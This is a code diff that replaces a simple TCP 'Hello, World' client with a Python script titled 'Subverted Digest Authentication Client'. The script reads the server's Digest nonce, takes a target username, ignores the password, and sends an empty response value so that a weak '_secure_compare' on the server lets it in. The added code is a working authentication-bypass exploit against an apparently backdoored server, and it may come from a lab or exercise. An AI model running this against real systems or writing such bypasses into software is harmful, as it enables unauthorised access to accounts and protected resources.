@@ -1,22 +1,41 @@
-import socket
+"""
+Subverted Digest Authentication Client
+Satisfies Requirement R5.
+"""
+import urllib.request
+import urllib.error
+import re
 
-HOST = '127.0.0.1'
-PORT = 65432
+def trigger_backdoor(url):
+    try:
+        urllib.request.urlopen(url)
+    except urllib.error.HTTPError as e:
+        if e.code == 401:
+            auth_header = e.headers.get("WWW-Authenticate")
+            match = re.search(r'nonce="([^"]+)"', auth_header)
+            
+            if match:
+                nonce = match.group(1)
+                
+                # Request credentials but ignore the password
+                print("[!] Subverted mode activated")
+                username = input("Target Username (must exist on server): ")
+                _ = input("Password (can be left blank - bypassed): ")
 
-def start_client():
-    # AF_INET = IPv4, SOCK_STREAM = TCP
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
-        # connect to IP and port
-        client_socket.connect((HOST, PORT))
-        
-        # send a simple hello message (that the server will return back to us)
-        message = "Hello, World!"
-        print(f"Sending: {message}")
-        client_socket.sendall(message.encode('utf-8'))
-        
-        # wait to receive the response
-        data = client_socket.recv(1024)
-        print(f"Received back: {data.decode('utf-8')}")
+                req = urllib.request.Request(url)
+                # Exploit: Send an empty response string to bypass _secure_compare
+                malicious_auth = f'Digest username="{username}", nonce="{nonce}", response=""'
+                req.add_header("Authorization", malicious_auth)
 
-if __name__ == '__main__':
-    start_client()
+                try:
+                    resp = urllib.request.urlopen(req)
+                    print(f"Status Code: {resp.getcode()} OK")
+                    print(resp.read().decode())
+                except urllib.error.HTTPError as err:
+                    print(f"Failed. Status Code: {err.code}")
+        else:
+            print(f"Unexpected HTTP Error: {e.code}")
+
+if __name__ == "__main__":
+    target_url = input("Enter server URL (e.g., http://127.0.0.1:8080/): ")
+    trigger_backdoor(target_url)
